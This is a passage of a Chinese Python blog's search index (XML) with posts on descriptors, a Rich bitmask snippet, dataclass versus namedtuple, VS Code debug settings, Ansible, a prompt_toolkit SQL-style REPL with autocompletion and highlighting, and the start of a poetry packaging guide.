<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python 描述符详解</title>
      <link href="/2022/03/10/python-%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/03/10/python-%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://zhuanlan.zhihu.com/p/52708890">很好的解析</a></li><li><a href="https://docs.python.org/zh-cn/3/howto/descriptor.html">官方文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 有趣的代码片段收集</title>
      <link href="/2022/03/10/python-%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%E6%94%B6%E9%9B%86/"/>
      <url>/2022/03/10/python-%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="使用二进制作为选项判断"><a href="#使用二进制作为选项判断" class="headerlink" title="使用二进制作为选项判断"></a>使用二进制作为选项判断</h2><p>这是在<code>Rich</code>中看到的一段, 用<code>sum</code>总和，得到那些参数为真</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">self._set_attributes = <span class="hljs-built_in">sum</span>(</span><span class="line">    (</span><span class="line">        bold <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>,</span><span class="line">        dim <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2</span>,</span><span class="line">        italic <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">4</span>,</span><span class="line">        underline <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">8</span>,</span><span class="line">        blink <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">16</span>,</span><span class="line">        blink2 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">32</span>,</span><span class="line">        reverse <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">64</span>,</span><span class="line">        conceal <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">128</span>,</span><span class="line">        strike <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">256</span>,</span><span class="line">        underline2 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">512</span>,</span><span class="line">        frame <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1024</span>,</span><span class="line">        encircle <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2048</span>,</span><span class="line">        overline <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">4096</span>,</span><span class="line">    )</span><span class="line">)</span><span class="line">self._attributes = (</span><span class="line">    <span class="hljs-built_in">sum</span>(</span><span class="line">        (</span><span class="line">            bold <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            dim <span class="hljs-keyword">and</span> <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            italic <span class="hljs-keyword">and</span> <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            underline <span class="hljs-keyword">and</span> <span class="hljs-number">8</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            blink <span class="hljs-keyword">and</span> <span class="hljs-number">16</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            blink2 <span class="hljs-keyword">and</span> <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            reverse <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            conceal <span class="hljs-keyword">and</span> <span class="hljs-number">128</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            strike <span class="hljs-keyword">and</span> <span class="hljs-number">256</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            underline2 <span class="hljs-keyword">and</span> <span class="hljs-number">512</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            frame <span class="hljs-keyword">and</span> <span class="hljs-number">1024</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            encircle <span class="hljs-keyword">and</span> <span class="hljs-number">2048</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            overline <span class="hljs-keyword">and</span> <span class="hljs-number">4096</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">        )</span><span class="line">    )</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 收集 </tag>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python dataclass 与 namedtuple</title>
      <link href="/2022/03/10/python-dataclass-%E4%B8%8E-namedtuple/"/>
      <url>/2022/03/10/python-dataclass-%E4%B8%8E-namedtuple/</url>
      
        <content type="html"><![CDATA[<p><code>dataclass</code> 与 <code>namedtuple</code>都是python重要的数据结构</p><h2 id="为什么要用到这两个数据结构"><a href="#为什么要用到这两个数据结构" class="headerlink" title="为什么要用到这两个数据结构"></a>为什么要用到这两个数据结构</h2><ol><li>如果只是简单的返回<code>return (&#39;name&#39;, 30)</code> 这样的话，就无法确保返回值被准确的调用</li><li>如果使用<code>return &#123;&#39;name&#39;: &#39;Elin&#39;, &#39;age&#39;: 30&#125;</code> 这样的话无法使用散列，并且需要跟踪key名称。另外dict是可变的。</li></ol><h2 id="dataclass-和-namedtuple-的差别"><a href="#dataclass-和-namedtuple-的差别" class="headerlink" title="dataclass 和 namedtuple 的差别"></a><code>dataclass</code> 和 <code>namedtuple</code> 的差别</h2><p>同样使数据结构，但是两个有一些差别。</p><p><code>dataclass</code>:</p><ul><li>可以设置默认值</li><li>定义<code>__post_init__</code>方法来延迟初始化一些默认值</li><li>默认不支持hash，需要关闭<code>unsafe_hash</code>参数</li><li>生成后可以修改值</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@dataclass</span></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>:</span></span><span class="line">    name: <span class="hljs-built_in">str</span></span><span class="line">    age: <span class="hljs-built_in">int</span></span><span class="line">    title: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__post_init__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self.title = <span class="hljs-string">f&quot;Hello <span class="hljs-subst">&#123;self.name&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">welcome</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Welcome <span class="hljs-subst">&#123;self.name&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line">p1 = Person(<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-number">30</span>)</span><span class="line"><span class="hljs-built_in">print</span>(p1.title)</span><span class="line"><span class="hljs-comment"># Hello John</span></span><span class="line"><span class="hljs-built_in">print</span>(p1.welcome())</span><span class="line"><span class="hljs-comment"># Welcome John</span></span></code></pre></div></div><p><code>namedtuple</code>:</p><ul><li>不能设置默认值</li><li>生成后不能修改值</li><li>使用<code>typing.NamedTuple</code>自定义类</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> namedtuple</span><span class="line"></br></span><span class="line">Person = namedtuple(<span class="hljs-string">&#x27;PersonA&#x27;</span>, <span class="hljs-string">&#x27;name age&#x27;</span>)</span><span class="line"></br></span><span class="line">p1 = Person(name=<span class="hljs-string">&#x27;John&#x27;</span>, age=<span class="hljs-number">30</span>)</span><span class="line"><span class="hljs-built_in">print</span>(p1.name)</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> NamedTuple</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>(<span class="hljs-params">NamedTuple</span>):</span></span><span class="line">    name: <span class="hljs-built_in">str</span></span><span class="line">    age: <span class="hljs-built_in">int</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">welcome</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;welcome <span class="hljs-subst">&#123;self.name&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line">p1 = Person(name=<span class="hljs-string">&#x27;John&#x27;</span>, age=<span class="hljs-number">30</span>)</span><span class="line"><span class="hljs-built_in">print</span>(p1.welcome())</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode Debug justMyCode</title>
      <link href="/2022/03/07/vscode-Debug-justMyCode/"/>
      <url>/2022/03/07/vscode-Debug-justMyCode/</url>
      
        <content type="html"><![CDATA[<p>在debug和pytest debug中添加 <code>justMyCode</code> 选项</p><ul><li>参考这个<a href="https://github.com/microsoft/vscode-python/issues/7083">issue</a></li></ul><pre><code class="json">&#123;    &quot;name&quot;: &quot;Python: 当前文件&quot;,    &quot;type&quot;: &quot;python&quot;,    &quot;request&quot;: &quot;launch&quot;,    &quot;program&quot;: &quot;$&#123;file&#125;&quot;,    &quot;console&quot;: &quot;integratedTerminal&quot;,    // highlight-next-line    &quot;justMyCode&quot;: false&#125;,// highlight-start&#123;    &quot;name&quot;: &quot;Debug Pytest&quot;,    &quot;type&quot;: &quot;python&quot;,    &quot;request&quot;: &quot;test&quot;,    &quot;justMyCode&quot;: false&#125;// highlight-end</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具收集</title>
      <link href="/2022/03/03/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"/>
      <url>/2022/03/03/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="ansible-自动化运维工具箱"><a href="#ansible-自动化运维工具箱" class="headerlink" title="ansible 自动化运维工具箱"></a>ansible <strong>自动化运维工具箱</strong></h2><ul><li><a href="https://segmentfault.com/a/1190000038230424">快速上手</a></li><li><a href="https://github.com/ansible/ansible">Github</a></li><li><a href="https://ansible-tran.readthedocs.io/en/latest/">官方中文文档</a></li></ul><p>Ansible 是一个配置管理和配置工具，类似于 Chef，Puppet 或 Salt。这是一款很简单也很容易入门的部署工具，它使用 SSH 连接到服务器并运行配置好的任务，服务器上不用安装任何多余的软件，只需要开启 ssh，所有工作都交给 client 端的 ansible 负责。</p><p>关于 Ansible 的一个好处是，将 bash 脚本转换为可执行任务是非常容易的。我们可以编写自己的配置程序，但是 Ansible 更加干净，因为它可以自动在执行任务之前获取上下文。ansible 任务是幂等的，没有大量额外的编码，ansible 可以一次又一次地安全运，而 bash 命令这种幂等性。</p><p>ansible 使用 “facts” 来确保任务的幂等安全运行， 它是在运行任务之前收集的系统和环境信息。ansible 使用这些 facts 来检查状态，看看是否需要改变某些东西以获得所需的结果。这使得 ansible 可以让服务器一次又一次地运行可复制的任务。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收集 </tag>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个极简的REPL交互示范</title>
      <link href="/2022/03/01/%E4%B8%80%E4%B8%AA%E6%9E%81%E7%AE%80%E7%9A%84REPL%E4%BA%A4%E4%BA%92%E7%A4%BA%E8%8C%83/"/>
      <url>/2022/03/01/%E4%B8%80%E4%B8%AA%E6%9E%81%E7%AE%80%E7%9A%84REPL%E4%BA%A4%E4%BA%92%E7%A4%BA%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<p>一个好的REPL(Read-Eval-Print Loop)，交互式命令行程序，需要具备以下几个特点：</p><ol><li>最基本的命令行与回显</li><li>回显带有分页效果，类似 more</li><li>带有历史命令推荐</li><li>关键词自动补全</li><li>语法高亮</li></ol><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>我们以模拟Sql的REPL来将这些特性一点点来累加起来</p><h3 id="基本命令行与回显"><a href="#基本命令行与回显" class="headerlink" title="基本命令行与回显"></a>基本命令行与回显</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(user_input)</span></code></pre></div></div><h3 id="添加分页效果"><a href="#添加分页效果" class="headerlink" title="添加分页效果"></a>添加分页效果</h3><p>使用的是<code>click.echo_via_pager</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line marked"><span class="hljs-keyword">import</span> click</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</span><span class="line marked">    click.echo_via_pager(user_input)</span></code></pre></div></div><h3 id="历史命令推荐"><a href="#历史命令推荐" class="headerlink" title="历史命令推荐"></a>历史命令推荐</h3><p>使用的是 <code>prompt_toolkit.history</code> 模块中的 <code>FileHistory</code><br>会创建一个历史记录的文件，然后通过<code>prompt_toolkit.auto_suggest.AutoSugguestFromHistory</code>进行推荐。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.history <span class="hljs-keyword">import</span> FileHistory</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.auto_suggest <span class="hljs-keyword">import</span> AutoSuggestFromHistory</span><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>,</span><span class="line marked">                        history=FileHistory(<span class="hljs-string">&#x27;history.txt&#x27;</span>),</span><span class="line marked">                        auto_suggest=AutoSuggestFromHistory(),</span><span class="line">                        )</span><span class="line">    click.echo_via_pager(user_input)</span></code></pre></div></div><h3 id="关键词补全"><a href="#关键词补全" class="headerlink" title="关键词补全"></a>关键词补全</h3><p>关键词补全有两种方法：</p><ol><li>用<code>prompt_toolkit.completion.WordCompleter</code> 直接定义单词</li><li>用<code>prompt_toolkit.completion</code> 中的 <code>Completer</code> 和 <code>Completion</code>配合<code>fuzzyfinder</code>进行模糊查询，这种方法自定义程度更高</li></ol><h4 id="WordCompleter"><a href="#WordCompleter" class="headerlink" title="WordCompleter"></a>WordCompleter</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.history <span class="hljs-keyword">import</span> FileHistory</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.auto_suggest <span class="hljs-keyword">import</span> AutoSuggestFromHistory</span><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.completion <span class="hljs-keyword">import</span> WordCompleter</span><span class="line marked"></br></span><span class="line marked">SQLCompleter = WordCompleter(</span><span class="line marked">    [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>], ignore_case=<span class="hljs-literal">True</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>,</span><span class="line">                        history=FileHistory(<span class="hljs-string">&#x27;history.txt&#x27;</span>),</span><span class="line">                        auto_suggest=AutoSuggestFromHistory(),</span><span class="line marked">                        completer=SQLCompleter,</span><span class="line">                        )</span><span class="line">    click.echo_via_pager(user_input)</span></code></pre></div></div><h4 id="fuzzyfinder"><a href="#fuzzyfinder" class="headerlink" title="fuzzyfinder"></a>fuzzyfinder</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.history <span class="hljs-keyword">import</span> FileHistory</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.auto_suggest <span class="hljs-keyword">import</span> AutoSuggestFromHistory</span><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.completion <span class="hljs-keyword">import</span> Completer, Completion</span><span class="line marked"><span class="hljs-keyword">from</span> fuzzyfinder.main <span class="hljs-keyword">import</span> fuzzyfinder</span><span class="line marked"></br></span><span class="line marked">SQLKeywords = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>]</span><span class="line marked"></br></span><span class="line marked"></br></span><span class="line marked"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQLCompleter</span>(<span class="hljs-params">Completer</span>):</span></span><span class="line marked">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_completions</span>(<span class="hljs-params">self, document, complete_event</span>):</span></span><span class="line marked">        word_before_cursor = document.get_word_before_cursor(WORD=<span class="hljs-literal">True</span>)</span><span class="line marked">        matches = fuzzyfinder(word_before_cursor, SQLKeywords)</span><span class="line marked">        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> matches:</span><span class="line marked">            <span class="hljs-keyword">yield</span> Completion(m, start_position=-<span class="hljs-built_in">len</span>(word_before_cursor))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>,</span><span class="line">                        history=FileHistory(<span class="hljs-string">&#x27;history.txt&#x27;</span>),</span><span class="line">                        auto_suggest=AutoSuggestFromHistory(),</span><span class="line marked">                        completer=SQLCompleter(),</span><span class="line">                        )</span><span class="line">    click.echo_via_pager(user_input)</span></code></pre></div></div><h3 id="语法高亮"><a href="#语法高亮" class="headerlink" title="语法高亮"></a>语法高亮</h3><p>高亮可以使用<code>Pygments.lexers</code> 模块</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.history <span class="hljs-keyword">import</span> FileHistory</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.auto_suggest <span class="hljs-keyword">import</span> AutoSuggestFromHistory</span><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.completion <span class="hljs-keyword">import</span> Completer, Completion</span><span class="line"><span class="hljs-keyword">from</span> fuzzyfinder.main <span class="hljs-keyword">import</span> fuzzyfinder</span><span class="line marked"><span class="hljs-keyword">from</span> pygments.lexers.sql <span class="hljs-keyword">import</span> SqlLexer</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.lexers <span class="hljs-keyword">import</span> PygmentsLexer</span><span class="line"></br></span><span class="line">SQLKeywords = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>]</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQLCompleter</span>(<span class="hljs-params">Completer</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_completions</span>(<span class="hljs-params">self, document, complete_event</span>):</span></span><span class="line">        word_before_cursor = document.get_word_before_cursor(WORD=<span class="hljs-literal">True</span>)</span><span class="line">        matches = fuzzyfinder(word_before_cursor, SQLKeywords)</span><span class="line">        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> matches:</span><span class="line">            <span class="hljs-keyword">yield</span> Completion(m, start_position=-<span class="hljs-built_in">len</span>(word_before_cursor))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;SQL&gt;&#x27;</span>,</span><span class="line">                        history=FileHistory(<span class="hljs-string">&#x27;history.txt&#x27;</span>),</span><span class="line">                        auto_suggest=AutoSuggestFromHistory(),</span><span class="line">                        completer=SQLCompleter(),</span><span class="line marked">                        lexer=PygmentsLexer(SqlLexer)</span><span class="line">                        )</span><span class="line">    click.echo_via_pager(user_input)</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>poetry 包管理使用方法</title>
      <link href="/2022/02/24/poetry-%E5%8C%85%E7%AE%A1%E7%90%86%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2022/02/24/poetry-%E5%8C%85%E7%AE%A1%E7%90%86%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="poetry-是什么"><a href="#poetry-是什么" class="headerlink" title="poetry 是什么"></a>poetry 是什么</h2><p>poetry 是一个虚拟环境和包管理的工具，并且还支持打包和发布。<br>可以用来管理python库和python程序。</p><h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">pip install poetry</span></code></pre></div></div><p>安装后检查版本</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ada codeBlockLines"><span class="line">poetry <span class="hljs-comment">--version </span></span></code></pre></div></div><h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><ul><li>在已有项目中</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry init</span></code></pre></div></div><ul><li>新建一个项目</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry new new_project</span><span class="line">poetry new --src new_project <span class="hljs-comment"># 将源码放在src目录下</span></span></code></pre></div></div><p>初始项目结构如下：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">.</span><span class="line">├── poetry.lock</span><span class="line">├── pyproject.toml</span><span class="line">├── README.rst</span><span class="line">├── rick_portal_gun</span><span class="line">│   └── __init__.py</span><span class="line">└── tests</span><span class="line">    ├── __init__.py</span><span class="line">    └── test_rick_portal_gun.py</span></code></pre></div></div><ul><li><code>README.rst</code> 建议改成 <code>.md</code></li><li><code>pyproject.toml</code> 此文件管理依赖列表和项目的各种 meta 信息，用来替代 Pipfile、requirements.txt、setup.py、setup.cfg、MANIFEST.in 等等各种配置文件。</li></ul><h3 id="pyproject-toml-文件"><a href="#pyproject-toml-文件" class="headerlink" title="pyproject.toml 文件"></a><code>pyproject.toml</code> 文件</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ini codeBlockLines"><span class="line"><span class="hljs-section">[tool.poetry]</span></span><span class="line"><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;elin-portal-gun&quot;</span>  <span class="hljs-comment"># Require  软件名称</span></span><span class="line"><span class="hljs-attr">version</span> = <span class="hljs-string">&quot;0.1.0&quot;</span> <span class="hljs-comment"># Require  软件版本</span></span><span class="line"><span class="hljs-attr">description</span> = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># Require  描述</span></span><span class="line"><span class="hljs-attr">authors</span> = [<span class="hljs-string">&quot;Elin &lt;365433079@qq.com&gt;&quot;</span>]  <span class="hljs-comment"># Require 作者</span></span><span class="line"><span class="hljs-attr">readme</span> = <span class="hljs-string">&quot;README.md&quot;</span>  <span class="hljs-comment">#  README.rst 或者 README.md</span></span><span class="line"><span class="hljs-attr">license</span> = <span class="hljs-string">&quot;GPL-3.0-or-later&quot;</span>  </span><span class="line"><span class="hljs-attr">maintainers</span> = [<span class="hljs-string">&quot;&quot;</span>]  <span class="hljs-comment"># 维护者</span></span><span class="line"><span class="hljs-attr">homepage</span> = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 项目URL地址</span></span><span class="line"><span class="hljs-attr">repository</span> = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 项目仓库URL地址</span></span><span class="line"><span class="hljs-attr">documentation</span> = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 项目文档URL地址</span></span><span class="line"><span class="hljs-attr">keywords</span> = [<span class="hljs-string">&quot;&quot;</span>] <span class="hljs-comment"># 项目标签（max：5）</span></span><span class="line"><span class="hljs-attr">classifiers</span> = = [</span><span class="line">    <span class="hljs-string">&quot;Topic :: Software Development :: Build Tools&quot;</span>,</span><span class="line">    <span class="hljs-string">&quot;Topic :: Software Development :: Libraries :: Python Modules&quot;</span></span><span class="line">]  <span class="hljs-comment"># 项目的分类 https://pypi.org/classifiers/</span></span><span class="line"><span class="hljs-attr">packages</span> = [</span><span class="line">    &#123; include = <span class="hljs-string">&quot;my_package&quot;</span>, from = <span class="hljs-string">&quot;src&quot;</span>&#125;, <span class="hljs-comment"># 如果包在src/my_package，需要指定from</span></span><span class="line">    &#123; include = <span class="hljs-string">&quot;extra_package/**/*.py&quot;</span> &#125;,</span><span class="line">] <span class="hljs-comment"># 包含的包，在标准情况下可以不需要，https://python-poetry.org/docs/pyproject/#packages</span></span><span class="line"><span class="hljs-attr">include</span> = [<span class="hljs-string">&quot;&quot;</span>] <span class="hljs-comment"># 包含的文件</span></span><span class="line"><span class="hljs-attr">exclude</span> = [<span class="hljs-string">&quot;&quot;</span>] <span class="hljs-comment"># 排除的文件</span></span><span class="line"></br></span><span class="line"></br></span><span 